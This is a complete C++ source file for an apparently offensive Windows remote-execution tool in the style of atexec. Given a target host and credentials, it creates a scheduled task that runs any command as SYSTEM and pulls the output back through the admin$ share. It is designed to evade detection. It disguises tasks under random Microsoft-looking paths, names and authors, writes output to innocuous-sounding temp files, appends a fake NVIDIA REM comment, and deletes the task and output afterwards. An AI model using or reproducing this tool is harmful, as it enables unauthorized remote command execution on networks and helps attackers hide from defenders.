#define _WIN32_DCOM
#define _CRT_SECURE_NO_WARNINGS   // 忽略老版本函数所提示的安全问题
#define UNICODE
#define _UNICODE

#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <comdef.h>
#include <string>
#include <time.h>
#include <taskschd.h>
#include <winnetwk.h>
#include <random>
#include <vector>

#pragma comment(lib,"taskschd.lib")
#pragma comment(lib,"comsupp.lib")
#pragma comment(lib, "ws2_32")   
#pragma comment(lib, "Mpr.lib")
#pragma comment(lib,"Advapi32.lib")

using namespace std;

// Windows错误代码定义
#ifndef ERROR_BAD_NETPATH
#define ERROR_BAD_NETPATH 53
#endif
#ifndef ERROR_LOGON_FAILURE
#define ERROR_LOGON_FAILURE 1326
#endif

ITaskService* pService = NULL;
ITaskFolder* pRootFolder = NULL;
HRESULT hr = S_OK;

// ========== 随机化函数 ==========

// 生成随机字符串
std::wstring GenerateRandomString(int length) {
	const wchar_t charset[] = L"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> dis(0, wcslen(charset) - 1);
	
	std::wstring result;
	for (int i = 0; i < length; i++) {
		result += charset[dis(gen)];
	}
	return result;
}

// 随机选择一个系统任务路径（伪装成合法系统任务）
std::wstring GetRandomTaskPath() {
	std::vector<std::wstring> taskPaths = {
		L"\\Microsoft\\Windows\\AppID",
		L"\\Microsoft\\Windows\\Application Experience",
		L"\\Microsoft\\Windows\\ApplicationData",
		L"\\Microsoft\\Windows\\Autochk",
		L"\\Microsoft\\Windows\\CertificateServicesClient",
		L"\\Microsoft\\Windows\\Chkdsk",
		L"\\Microsoft\\Windows\\Clip",
		L"\\Microsoft\\Windows\\CloudExperienceHost",
		L"\\Microsoft\\Windows\\Customer Experience Improvement Program",
		L"\\Microsoft\\Windows\\Data Integrity Scan",
		L"\\Microsoft\\Windows\\Defrag",
		L"\\Microsoft\\Windows\\Device Information",
		L"\\Microsoft\\Windows\\Diagnosis",
		L"\\Microsoft\\Windows\\DiskCleanup",
		L"\\Microsoft\\Windows\\DiskFootprint",
		L"\\Microsoft\\Windows\\Maintenance",
		L"\\Microsoft\\Windows\\MemoryDiagnostic",
		L"\\Microsoft\\Windows\\Power Efficiency Diagnostics",
		L"\\Microsoft\\Windows\\Registry",
		L"\\Microsoft\\Windows\\Windows Error Reporting"
	};
	
	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> dis(0, taskPaths.size() - 1);
	
	return taskPaths[dis(gen)];
}

// 生成随机的任务名称（看起来像系统任务）
std::wstring GenerateRandomTaskName() {
	std::vector<std::wstring> prefixes = {
		L"Background", L"Cache", L"Cleanup", L"Config", L"Data", L"Device", 
		L"Diagnostic", L"Display", L"Driver", L"Microsoft", L"Network", L"Notification",
		L"Policy", L"Power", L"Recovery", L"Registry", L"Scheduled", L"Security",
		L"Service", L"Storage", L"System", L"Task", L"Update", L"User", L"Windows"
	};
	
	std::vector<std::wstring> suffixes = {
		L"Agent", L"Check", L"Cleanup", L"Helper", L"Handler", L"Manager", L"Monitor",
		L"Process", L"Processor", L"Scanner", L"Service", L"Task", L"Update", L"Verifier"
	};
	
	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> prefixDis(0, prefixes.size() - 1);
	std::uniform_int_distribution<> suffixDis(0, suffixes.size() - 1);
	
	return prefixes[prefixDis(gen)] + suffixes[suffixDis(gen)];
}

// 生成随机的输出文件名
std::wstring GenerateRandomOutputFile() {
	std::vector<std::wstring> filenames = {
		L"temp.log", L"cache.tmp", L"runtime.dat", L"config.ini", L"update.log",
		L"diagnostic.txt", L"report.tmp", L"status.dat", L"event.log", L"trace.txt"
	};
	
	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> dis(0, filenames.size() - 1);
	
	return L"C:\\Windows\\Temp\\" + filenames[dis(gen)];
}

// 随机选择作者名称
std::wstring GetRandomAuthor() {
	std::vector<std::wstring> authors = {
		L"Microsoft Corporation",
		L"Microsoft Windows",
		L"Windows System",
		L"System Administrator",
		L"NT AUTHORITY\\SYSTEM"
	};
	
	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> dis(0, authors.size() - 1);
	
	return authors[dis(gen)];
}

// 生成随机时间间隔（1-3秒）
int GetRandomDelay() {
	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> dis(1, 3);
	return dis(gen);
}

BOOL ConnectTaskServer(LPCWSTR lpwsHost, LPCWSTR lpwDomain,LPCWSTR lpwsUserName, LPCWSTR lpwsPassword) {
	// 初始化COM组件
	hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	// 设置组件安全等级
	hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
	// 创建任务服务容器
	hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
	// 连接目标服务器为远程连接或本地服务器
	hr = pService->Connect(_variant_t(lpwsHost), _variant_t(lpwsUserName), _variant_t(lpwDomain), _variant_t(lpwsPassword));	//默认本地
	if (FAILED(hr))
	{
		printf("ITaskService::Connect failed: %x \n", hr);
		
		pService->Release();
		CoUninitialize();
		return FALSE;
	}
	return TRUE;
}


DWORD ConnectSMBServer(LPCWSTR lpwsHost, LPCWSTR lpwsUserName, LPCWSTR lpwsPassword, LPCWSTR lpwDomain)
{
	// 用于存放SMB共享资源格式
	PWCHAR lpwsIPC = new WCHAR[MAX_PATH];
	PWCHAR lpwsFullUserName = new WCHAR[MAX_PATH];
	DWORD dwRetVal; // 函数返回值
	NETRESOURCEW nr; // 连接的详细信息
	DWORD dwFlags; // 连接选项

	ZeroMemory(&nr, sizeof(NETRESOURCEW));
	swprintf(lpwsIPC, MAX_PATH, L"\\\\%ls\\admin$", lpwsHost);
	
	// 如果提供了域名，将用户名格式化为 domain\username
	if (lpwDomain != NULL && wcslen(lpwDomain) > 0) {
		swprintf(lpwsFullUserName, MAX_PATH, L"%ls\\%ls", lpwDomain, lpwsUserName);
		wprintf(L"[*] Using domain credentials: %ls\n", lpwsFullUserName);
	} else {
		// 否则直接使用用户名
		wcscpy(lpwsFullUserName, lpwsUserName);
	}
	
	nr.dwType = RESOURCETYPE_ANY; // 枚举所有资源
	nr.lpLocalName = NULL;
	nr.lpRemoteName = lpwsIPC; // 资源的网络名
	nr.lpProvider = NULL;

	// 不使用 CONNECT_UPDATE_PROFILE，使用 CONNECT_TEMPORARY 更合适
	dwFlags = CONNECT_TEMPORARY;

	wprintf(L"[*] Attempting SMB connection to: %ls\n", lpwsIPC);
	dwRetVal = WNetAddConnection2W(&nr, lpwsPassword, lpwsFullUserName, dwFlags);
	
	delete[] lpwsIPC;
	delete[] lpwsFullUserName;
	
	if (dwRetVal == NO_ERROR) {
		// 返回NO_ERROR则成功
		return dwRetVal;
	}

	wprintf(L"WNetAddConnection2 failed with error: %u\n", dwRetVal);
	
	// 提供更详细的错误信息
	switch (dwRetVal) {
		case ERROR_ACCESS_DENIED:
			wprintf(L"[!] Error: Access denied. Check username and password.\n");
			break;
		case ERROR_ALREADY_ASSIGNED:
			wprintf(L"[!] Error: Local device already in use.\n");
			break;
		case ERROR_BAD_DEVICE:
			wprintf(L"[!] Error: Invalid device specified.\n");
			break;
		case ERROR_BAD_NET_NAME:
			wprintf(L"[!] Error: Network name cannot be found.\n");
			break;
		case ERROR_BAD_NETPATH:
			wprintf(L"[!] Error: Network path not found. Check if SMB is accessible.\n");
			break;
		case ERROR_INVALID_PASSWORD:
			wprintf(L"[!] Error: Invalid password.\n");
			break;
		case ERROR_LOGON_FAILURE:
			wprintf(L"[!] Error: Logon failure. Check credentials.\n");
			break;
		default:
			wprintf(L"[!] Error: Unknown error occurred.\n");
			break;
	}
	
	return -1;
}

BOOL GetSMBServerFileContent(LPCWSTR lpwsDstPath) {
	DWORD dwFileSize = 0;
	PCHAR readBuf = NULL;
	DWORD dwReaded = 0;
	BOOL bRet = TRUE;
	HANDLE hFile = CreateFileW(lpwsDstPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		wprintf(L"Can't Read File : %ls \n", lpwsDstPath);
		return FALSE;
	}
	// 获取文件大小
	dwFileSize = GetFileSize(hFile, NULL);
	readBuf = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize + 1);
	ReadFile(hFile, readBuf, dwFileSize, &dwReaded, NULL);
	readBuf[dwFileSize] = '\0'; // 确保字符串结束
	wprintf(L"===========================\n");
	printf("%s", readBuf);
	CloseHandle(hFile);
	HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, readBuf);
	wprintf(L"\n===========================\n");
	return TRUE;
}

// 删除远程临时文件
BOOL DeleteRemoteFile(LPCWSTR lpwsFilePath) {
	wprintf(L"[*] Cleaning up remote temporary file...\n");
	if (DeleteFileW(lpwsFilePath)) {
		wprintf(L"[+] Remote file deleted successfully: %ls\n", lpwsFilePath);
		return TRUE;
	} else {
		DWORD dwError = GetLastError();
		wprintf(L"[!] Warning: Failed to delete remote file (Error: %d)\n", dwError);
		// 不返回FALSE，因为这不是关键错误
		return TRUE;
	}
}

// 获取未来N秒后的时间（随机延迟）
std::wstring GetTime(int delaySeconds) {
	WCHAR CurrentTime[100];
	SYSTEMTIME sys;
	GetLocalTime(&sys);
	sys.wSecond += delaySeconds;
	while (sys.wSecond >= 60) {
		sys.wMinute++;
		sys.wSecond -= 60;
	}
	if (sys.wMinute >= 60) {
		sys.wHour++;
		sys.wMinute -= 60;
	}
	if (sys.wHour >= 24) {
		sys.wDay++;
		sys.wHour -= 24;
	}
	swprintf(CurrentTime, 100, L"%4d-%02d-%02dT%02d:%02d:%02d", sys.wYear, sys.wMonth, sys.wDay, sys.wHour, sys.wMinute, sys.wSecond);
	std::wstring returnTime(CurrentTime);
	std::wcout << L"[*] Task will execute at: " << returnTime << std::endl;
	return returnTime;
}


BOOL CreatTask(LPCWSTR wTaskName, LPCWSTR wCommand, LPCWSTR wOutPutPath, int delaySeconds, LPCWSTR taskPath, LPCWSTR author) {
	std::wstring CurrentTime;
	std::wstring CommandArgs(L"/c ");
	CommandArgs.append(wCommand);
	CommandArgs.append(L" >");
	CommandArgs.append(wOutPutPath);
	// 添加伪装注释，看起来像NVIDIA显示容器服务
	CommandArgs.append(L" & REM NVDisplay.ContainerLocalSystem");

	wstring wstrExePath(L"C:\\Windows\\System32\\cmd.exe");
	
	// 使用随机的任务路径
	wprintf(L"[*] Using task path: %ls\n", taskPath);
	pService->GetFolder(_bstr_t(taskPath), &pRootFolder);
	// 如果存在同名任务，删除它
	pRootFolder->DeleteTask(_bstr_t(wTaskName), 0);

	// 使用ITaskDefinition对象定义任务相关信息
	ITaskDefinition* pTask = NULL;
	pService->NewTask(0, &pTask);

	// 使用IRegistrationInfo对象对任务的基础信息填充
	IRegistrationInfo* pRegInfo = NULL;
	pTask->get_RegistrationInfo(&pRegInfo);
	// 使用随机的作者名称
	pRegInfo->put_Author(_bstr_t(author));

	// 创建任务的安全凭证
	IPrincipal* pPrincipal = NULL;
	pTask->get_Principal(&pPrincipal);

	// 设置规则为交互式登录
	pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);

	pPrincipal->put_UserId(_bstr_t(L"NT AUTHORITY\\SYSTEM"));

	// 创建任务的设置信息
	ITaskSettings* pTaskSettings = NULL;
	pTask->get_Settings(&pTaskSettings);
	// 为设置信息赋值
	pTaskSettings->put_StartWhenAvailable(VARIANT_TRUE);
	// 设置任务的idle设置
	IIdleSettings* pIdleSettings = NULL;
	pTaskSettings->get_IdleSettings(&pIdleSettings);
	pIdleSettings->put_WaitTimeout(_bstr_t(L"PT1M"));

	//创建触发器
	ITriggerCollection* pTriggerCollection = NULL;
	pTask->get_Triggers(&pTriggerCollection);
	ITrigger* pTrigger = NULL;

	hr = pTriggerCollection->Create(TASK_TRIGGER_TIME, &pTrigger);
	if (FAILED(hr))
	{
		printf("\nCannot create the trigger: %x", hr);
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return FALSE;
	}
	// 设置时间触发器
	ITimeTrigger* pTimeTrigger = NULL;
	pTrigger->QueryInterface(IID_ITimeTrigger, (void**)&pTimeTrigger);
	// 使用随机的触发器ID
	std::wstring triggerId = L"Trigger" + GenerateRandomString(6);
	pTimeTrigger->put_Id(_bstr_t(triggerId.c_str()));
	// 使用随机的延迟时间
	CurrentTime = GetTime(delaySeconds);
	pTimeTrigger->put_StartBoundary(_bstr_t(CurrentTime.data()));
	// 生成随机的结束时间（1-3年后）
	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> yearDis(1, 3);
	int randomYear = 2025 + yearDis(gen);
	std::uniform_int_distribution<> monthDis(1, 12);
	std::uniform_int_distribution<> dayDis(1, 28);
	std::uniform_int_distribution<> hourDis(0, 23);
	WCHAR endTime[100];
	swprintf(endTime, 100, L"%d-%02d-%02dT%02d:00:00", randomYear, monthDis(gen), dayDis(gen), hourDis(gen));
	pTimeTrigger->put_EndBoundary(_bstr_t(endTime));
	// 创建任务动作
	IActionCollection* pActionCollection = NULL;
	pTask->get_Actions(&pActionCollection);
	IAction* pAction = NULL;
	pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
	IExecAction* pExecAction = NULL;
	// 出入执行命令及参数
	pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
	pExecAction->put_Path(_bstr_t(wstrExePath.c_str()));
	pExecAction->put_Arguments(_bstr_t(CommandArgs.data()));

	IRegisteredTask* pRegistredTask = NULL;
	pRootFolder->RegisterTaskDefinition(_bstr_t(wTaskName), pTask, TASK_CREATE_OR_UPDATE,
		_variant_t(), _variant_t(), TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(), &pRegistredTask);
	// 使用随机延迟时间等待任务执行
	wprintf(L"[*] Waiting for task execution (%d seconds)...\n", delaySeconds);
	Sleep(delaySeconds * 1000);
	Sleep(2000); // 额外等待2秒确保输出完成
	// 结束时删除任务
	wprintf(L"[*] Cleaning up task...\n");
	pRootFolder->DeleteTask(_bstr_t(wTaskName), 0);
	pRootFolder->Release();
	pService->Release();
	CoUninitialize();
	return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {
	BOOL bRetVal = FALSE;
	LPCWSTR lpwDomain = NULL;
	
	wprintf(L"============================================\n");
	wprintf(L"  Advanced Task Execution Tool v2.0\n");
	wprintf(L"  With Randomization & Auto Cleanup\n");
	wprintf(L"============================================\n\n");
	
	if (argc < 5) {
		wprintf(L"atexec.exe <Host> <Username> <Password> <Command> [Domain] \n");
		wprintf(L"Usage: \n");
		wprintf(L"atexec.exe 192.168.3.130 Administrator 123456 whoami SYS.LOCAL\n");
		wprintf(L"atexec.exe 192.168.3.130 Administrator 123456 whoami\n");
		return 0;
	}
	if (argc == 6) {
		lpwDomain = argv[5]; // 域名
	}
	LPCWSTR wsCommand = argv[4]; // 执行命令
	LPCWSTR lpwsHost = argv[1]; // 目标机器地址
	LPCWSTR lpwsUserName = argv[2]; // 账号
	LPCWSTR lpwsPassword = argv[3]; // 密码
	
	// ========== 随机化处理 ==========
	wprintf(L"[*] Initializing randomization...\n");
	
	// 生成随机任务名称
	std::wstring randomTaskName = GenerateRandomTaskName();
	wprintf(L"[*] Generated task name: %ls\n", randomTaskName.c_str());
	
	// 生成随机任务路径
	std::wstring randomTaskPath = GetRandomTaskPath();
	
	// 生成随机输出文件
	std::wstring randomOutputFile = GenerateRandomOutputFile();
	wprintf(L"[*] Output file: %ls\n", randomOutputFile.c_str());
	
	// 生成随机作者
	std::wstring randomAuthor = GetRandomAuthor();
	wprintf(L"[*] Author: %ls\n", randomAuthor.c_str());
	
	// 生成随机延迟
	int randomDelay = GetRandomDelay();
	wprintf(L"[*] Execution delay: %d seconds\n", randomDelay);
	
	// 构建SMB文件路径
	std::wstring wsHostFile;
	wsHostFile.append(L"\\\\");
	wsHostFile.append(lpwsHost);
	wsHostFile.append(L"\\admin$\\Temp\\");
	// 提取文件名
	size_t lastSlash = randomOutputFile.find_last_of(L"\\");
	if (lastSlash != std::wstring::npos) {
		wsHostFile.append(randomOutputFile.substr(lastSlash + 1));
	}
	
	wprintf(L"\n[*] Connecting to task scheduler on %ls...\n", lpwsHost);
	// 连接任务计划
	bRetVal = ConnectTaskServer(lpwsHost, lpwDomain, lpwsUserName, lpwsPassword);
	if (!bRetVal) {
		wprintf(L"[-] Failed to connect to task scheduler!\n");
		return -1;
	}
	wprintf(L"[+] Successfully connected!\n\n");

	wprintf(L"[*] Creating scheduled task...\n");
	bRetVal = CreatTask(randomTaskName.c_str(), wsCommand, randomOutputFile.c_str(), 
	                    randomDelay, randomTaskPath.c_str(), randomAuthor.c_str());
	if (!bRetVal) {
		wprintf(L"[-] Failed to create task!\n");
		return -1;
	}
	wprintf(L"[+] Task created successfully!\n\n");
	// 连接目标服务器SMB获取输出
	wprintf(L"[*] Retrieving command output via SMB...\n");
	if (ConnectSMBServer(lpwsHost, lpwsUserName, lpwsPassword, lpwDomain) == 0) {
		// 连接成功
		wprintf(L"[+] SMB connection established!\n\n");
		GetSMBServerFileContent(wsHostFile.data());
		// 删除远程临时文件
		DeleteRemoteFile(wsHostFile.data());
		wprintf(L"\n[+] Operation completed successfully!\n");
	}
	else {
		wprintf(L"[-] Can't connect to SMB on %ls\n", lpwsHost);
		wprintf(L"[!] Command may have executed but output retrieval failed.\n");
	}

	wprintf(L"\n============================================\n");
	return 0;
}